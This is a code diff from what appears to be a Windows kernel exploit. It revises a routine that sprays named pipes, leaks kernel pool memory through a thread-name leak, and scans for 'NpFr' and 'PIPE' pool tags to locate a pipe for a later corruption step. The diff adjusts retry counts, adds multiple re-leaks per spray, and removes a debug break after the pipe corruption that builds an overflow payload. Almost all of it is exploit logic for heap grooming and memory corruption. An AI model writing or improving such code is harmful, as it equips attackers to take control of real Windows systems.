@@ -32,7 +32,7 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
     {
         // Request leak from the registered ThreadNameManager
 
-        if (!nameManagerLocked->GetDataLeak(CHUNKSIZE, CHUNKSIZE * 10, 2)) {
+        if (!nameManagerLocked->GetDataLeak(CHUNKSIZE, CHUNKSIZE * 10, 10)) {
             return std::nullopt;
         }
 
@@ -66,56 +66,68 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
                 return std::nullopt;
             }
 
-            const int REFRESH_LOOP_MAX = 50;
+            const int REFRESH_LOOP_MAX = 16;
+            const int RELEAKS_PER_CREATE = 4; // multiple cheap re-leaks per create without calling GetDataLeak
+
+            // Pre-sort iosbOffsets for efficient nearest-NpFr lookup
+            std::sort(iosbOffsets.begin(), iosbOffsets.end());
+
             for (int r = 0; r < REFRESH_LOOP_MAX; ++r) {
                 // create pipes for this attempt
                 pipeManagerLocked->CreatePipes(pipeCreateSize);
 
-                //if (r > 0) { Sleep(50); }
+                // small exponential backoff sleep based on attempt number to reduce kernel churn
+                //if (r > 0) { Sleep(20 + (r * 10)); }
 
-                BYTE* refreshPtr = nameManagerLocked->LeakDataMalloc();
-                if (!refreshPtr) {
-                    // failed to get leak; cleanup pipes and try next iteration
-					DEBUG_PRINT(" [!] Failed to get leak on refresh attempt %d\n", r);
-                    InvokePassOverflow();
-                    pipeManagerLocked->ClearPipes();
-                    continue;
-                }
-                leakedDataBuffer.assign(refreshPtr, refreshPtr + nameManagerLocked->leakSize);
-                free(refreshPtr);
+                for (int lr = 0; lr < RELEAKS_PER_CREATE; ++lr) {
+                    //if (lr > 0) { Sleep(30); }
 
-                // scan for NpFr markers (pipe base); use PIPE only to read index
-                std::vector<UINT64> npfrMarkers = ScanForPoolTag(leakedDataBuffer.data(), leakSize, "NpFr");
-                if (npfrMarkers.empty()) {
-                    // not found this iteration
-					DEBUG_PRINT(" [*] No NpFr markers found in refresh attempt %d\n", r);
-                    pipeManagerLocked->ClearPipes();
-                    leakedDataBuffer.clear();
-                    continue;
-                }
+                    BYTE* refreshPtr = nameManagerLocked->LeakDataMalloc();
+                    if (!refreshPtr) {
+                        DEBUG_PRINT(" [!] Failed to get leak on re-leak attempt %d (create %d)\n", lr, r);
+                        InvokePassOverflow();
+                        continue;
+                    }
 
-				DEBUG_PRINT(" [*] Found %zu NpFr markers in refresh attempt %d\n", npfrMarkers.size(), r);
-                bool foundHere = false;
-                for (UINT64 iosbOffset : iosbOffsets) {
-                    for (UINT64 npfrOffset : npfrMarkers) {
-                        if (npfrOffset > iosbOffset) {
+                    // scan for NpFr markers directly in the raw buffer to avoid copies
+                    std::vector<UINT64> npfrMarkers = ScanForPoolTag(refreshPtr, leakSize, "NpFr");
+                    if (npfrMarkers.empty()) {
+                        // not found in this re-leak
+                        free(refreshPtr);
+                        continue;
+                    }
+
+                    // sort markers for nearest selection
+                    std::sort(npfrMarkers.begin(), npfrMarkers.end());
+
+                    // For each iosb, try the nearest npfr that is > iosb (use lower_bound)
+                    for (UINT64 iosbOffset : iosbOffsets) {
+                        auto it = std::lower_bound(npfrMarkers.begin(), npfrMarkers.end(), iosbOffset + 1);
+                        // check a small window of candidates (it and next few)
+                        for (int cand = 0; cand < 3 && it + cand != npfrMarkers.end(); ++cand) {
+                            UINT64 npfrOffset = *(it + cand);
+                            if (npfrOffset <= iosbOffset) continue;
+
                             UINT64 pipeBase = (npfrOffset >= 0x4) ? (npfrOffset - 0x4) : 0;
                             if (pipeBase >= leakSize) continue;
 
-                            std::vector<UINT64> markerOffsets = ScanForPoolTag(leakedDataBuffer.data() + pipeBase, CHUNKSIZE, "PIPE");
+                            // ensure we don't read past the leaked buffer when searching for PIPE
+                            UINT64 remaining = leakSize - pipeBase;
+                            size_t searchSize = (size_t)((remaining < (UINT64)CHUNKSIZE) ? remaining : (UINT64)CHUNKSIZE);
+                            if (searchSize == 0) continue;
+
+                            std::vector<UINT64> markerOffsets = ScanForPoolTag(refreshPtr + pipeBase, searchSize, "PIPE");
                             if (markerOffsets.empty()) continue;
 
                             size_t markerPosRel = (size_t)markerOffsets.front();
                             UINT64 absolutePos = pipeBase + markerPosRel;
-                            // pipeIndex is a 4-byte uint immediately after the 'PIPE' tag
                             const UINT64 indexPos = absolutePos + 4;
                             if (indexPos + sizeof(UINT32) > leakSize) continue;
 
-                            UINT32 pipeIndex = *(UINT32*)(leakedDataBuffer.data() + indexPos);
-                            DEBUG_PRINT("     Found NpFr at %llx -> pipeBase=%llx, PIPE index=%u, IoSB=%llx\n", npfrOffset, pipeBase, pipeIndex, iosbOffset);
+                            UINT32 pipeIndex = *(UINT32*)(refreshPtr + indexPos);
+                            DEBUG_PRINT("     Found NpFr at %llx -> pipeBase=%llx, PIPE index=%u, IoSB=%llx (create %d re-leak %d)\n", npfrOffset, pipeBase, pipeIndex, iosbOffset, r, lr);
 
                             UINT64 distance = pipeBase - iosbOffset;
-
                             UINT64 desiredEnd = pipeBase + CHUNKSIZE + 0x20;
                             if (desiredEnd > leakSize) desiredEnd = leakSize;
                             if (iosbOffset >= desiredEnd) continue;
@@ -124,21 +136,24 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
 
                             LeakLayoutResult result;
                             result.leakedData.resize((size_t)sliceLen);
-                            memcpy(result.leakedData.data(), leakedDataBuffer.data() + iosbOffset, (size_t)sliceLen);
+                            memcpy(result.leakedData.data(), refreshPtr + iosbOffset, (size_t)sliceLen);
                             result.targetPipeOffset = distance;
                             result.pipeIndex = pipeIndex;
+                            free(refreshPtr);
                             // keep pipes intact and do not InvokePassOverflow
                             return result;
                         }
                     }
+
+                    free(refreshPtr);
                 }
 
-                // Not found this iteration: clear pipes and continue
+                // Not found this create -> clear pipes and try again (less churn: clear once per create)
                 pipeManagerLocked->ClearPipes();
-                leakedDataBuffer.clear();
+                // small pause before next create to give kernel time
             }
             InvokePassOverflow();
-
+            Sleep(100);
         }
     }
     return std::nullopt;
@@ -164,6 +179,15 @@ bool MemoryBroker::CorruptPipe()
         DEBUG_PRINT(" [!] leakedData too small for payload copy\n");
         return false;
     }
+
+
+
+
+
+
+
+
+
 
     // Build payload; use vector to own memory
     std::vector<BYTE> payload((size_t)CHUNKSIZE + 0x20);
@@ -194,11 +218,10 @@ bool MemoryBroker::CorruptPipe()
         return false;
     }
 
-
-	Sleep(1000); // Sleep to allow system to stabilize after corruption
-    __debugbreak();
     return true;
 }
+
+
 
 
 
